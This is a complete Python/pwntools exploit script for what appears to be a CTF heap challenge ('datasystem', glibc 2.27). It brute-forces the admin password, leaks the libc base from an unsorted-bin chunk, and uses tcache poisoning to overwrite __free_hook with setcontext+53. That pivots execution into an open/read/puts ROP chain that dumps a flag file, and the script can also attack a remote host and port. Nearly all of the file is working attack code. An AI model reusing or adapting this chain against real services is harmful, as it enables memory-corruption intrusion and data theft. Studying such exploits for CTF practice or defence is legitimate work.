from pwn import *
import sys
from LibcSearcher import *
# context.log_level='debug'
context.arch='amd64'

def ret2libc(leak,func,path=''):
    if path == '':
        libc = LibcSearcher(func,leak)
        base = leak - libc.dump(func)
        system = base + libc.dump('system')
        binsh = base + libc.dump('str_bin_sh')
    else:
        libc = path
        libc.address = leak - libc.sym[func]
        system = libc.sym['system']
        binsh = next(libc.search(b'/bin/sh'))
    return (system,binsh)

s = lambda data : io.send(data)
sa = lambda str1,data : io.sendafter(str1,data)
sl = lambda data : io.sendline(data)
sla = lambda str1,data : io.sendlineafter(str1,data)
r = lambda num : io.recv(num)
rl = lambda keepends=True : io.recvline(keepends)
ru = lambda data,drop=True : io.recvuntil(data,drop)
ia = lambda : io.interactive()
uu32 = lambda data : u32(data.ljust(4,b'\x00'))
uu64 = lambda data : u64(data.ljust(8,b'\x00'))
i16 = lambda data : int(data,16)
leak = lambda name,addr : log.success('{} = {:#x}'.format(name, addr))
dbg = lambda : gdb.attach(io)

if len(sys.argv) == 3:
    io = remote(sys.argv[1], sys.argv[2])
elif len(sys.argv) == 2:
    if ':' in sys.argv[1]:
        rmt = sys.argv[1].split(':')
        io = remote(rmt[0], rmt[1])
    else:
        io = process(sys.argv[1])
        elf = ELF(sys.argv[1])
else:
    io = process('./datasystem')

elf = ELF("./datasystem")
libc = ELF("/home/bi0x/ctftools/pwntools/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so")

def getpwd():
    for c in range(0x100):
        c = c.to_bytes(1, 'big')
        p = process('./datasystem')
        p.sendafter("please input username: ", "admin\x00")
        p.sendafter("please input password: ", c*32)
        msg = p.recvline()
        if b"Fail" not in msg:
            print('='*60)
            print("a valid char:", c)
            print('='*60)
            p.close()
            return c*32
        p.close()

def login():
    pwd = getpwd()
    sla("username","admin\x00")
    sla("password",pwd)

def add(size,content="a"):
    sla(">>","1")
    sla("Size",str(size))
    sla("Content",content)

def free(index):
    sla(">>","2")
    sla("Index",str(index))

def show(index):
    sla(">>","3")
    sla("Index",str(index))

def edit(index,content):
    sla(">>","4")
    sla("Index",str(index))
    sa("Content",content)

login()

add(0x420) # 0 unsorted bin
add(0x10) # 1

free(0) # get unsorted bin

add(0x8) # 0
edit(0,"b"*7+"x")

show(0) # leak libc_base
ru("x")
libc_base = uu64(ru("\x7f",False))-0x3ec090
leak("libc_base",libc_base)

libc.address = libc_base

read_addr = libc.sym['read']
open_addr = libc.sym['open']
puts_addr = libc.sym['puts']
free_hook = libc.sym["__free_hook"]
setcontext = libc.sym['setcontext'] + 53

ret = next(libc.search(asm('ret')))
syscall = next(libc.search(asm("syscall")))
pop_rdi = next(libc.search(asm("pop rdi; ret")))
pop_rsi = next(libc.search(asm("pop rsi; ret")))
pop_rax_ret = next(libc.search(asm("pop rax; ret")))
pop_rdx_ret = next(libc.search(asm("pop rdx; ret")))
pop_rdx__rbx_ret = next(libc.search(asm("pop rdx; pop rbx; ret")))

add(0x20) # 2
free(2)
free(0)

payload = b"bi0xbi0x"*2 + p64(0) +  p64(0x301) + p64(free_hook)
add(0x10,payload) # 0
# dbg()
add(0x20)
# dbg()

flag_addr = free_hook + 0x150

orw = flat(
    pop_rdi , flag_addr , pop_rsi , 0 , open_addr,
    pop_rdi , 3 , pop_rsi , flag_addr , pop_rdx__rbx_ret , 0x100 , 0 , read_addr,
    pop_rdi , flag_addr , puts_addr
)

# print(hex(len(orw)))
# free_hook改为setcontext+53，然后将setcontex+0xa0的位置改为orw的位置，将+0xa8的位置改为ret的地址
payload = p64(setcontext) + orw + p64(0)*3 + p64(free_hook+8) + p64(ret)
# print(hex(len(payload)))
add(0x20,payload.ljust(0x150,b"\x00") + b"flag\x00")
dbg()
free(3)

ia()